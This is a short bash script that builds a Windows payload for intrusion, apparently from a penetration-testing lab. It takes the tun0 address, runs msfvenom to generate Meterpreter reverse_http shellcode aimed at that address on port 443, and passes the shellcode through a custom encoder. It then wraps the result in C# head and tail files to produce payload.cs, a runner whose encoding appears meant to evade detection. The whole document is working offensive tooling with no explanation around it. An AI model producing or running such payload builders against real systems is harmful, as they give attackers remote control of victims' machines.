#!/bin/bash
#get ip address of tun0
default_ip=$(ip --brief a | grep tun0 | awk '{print $3}' | sed 's/\/\w\+//g')
default_port=443
default_payload='windows/x64/meterpreter/reverse_http'

while [[ $# -gt 0 ]]; do
	case $1 in
		-p)
			shift
			opt_port="$1"
			shift
			;;
		-i)
			shift
			opt_ip="$1"
			shift
			;;
		-x)
			shift
			opt_payload="$1"
			shift
			;;
	esac
done

if [[ $# -eq 0 ]]; then
	echo "no arguments given, going with defaults"
fi

if [ -z $opt_port ]; then
	port=$default_port
	echo "port = $port"
else
	port="$opt_port"
	echo "port = $port"
fi

if [ -z $opt_ip ]; then
	ipaddr=$default_ip
	echo "ip = $ipaddr"
else
	ipaddr=$opt_ip
	echo "ip = $ipaddr"
fi

if [ -z $opt_payload ]; then
	payload=$default_payload
	echo "payload = $payload"
else
	payload=$opt_payload
	echo "payload = $payload"
fi

msfvenom -p $payload LHOST=$ipaddr LPORT=$port -f raw -o shell.txt
#mono caesar.exe

cat head.cs > payload.cs
mono encoder.exe >> payload.cs
cat tail.cs >> payload.cs

echo "Finished, payload located at payload.cs"

#mcs -out:csrunner.exe csrunner.cs
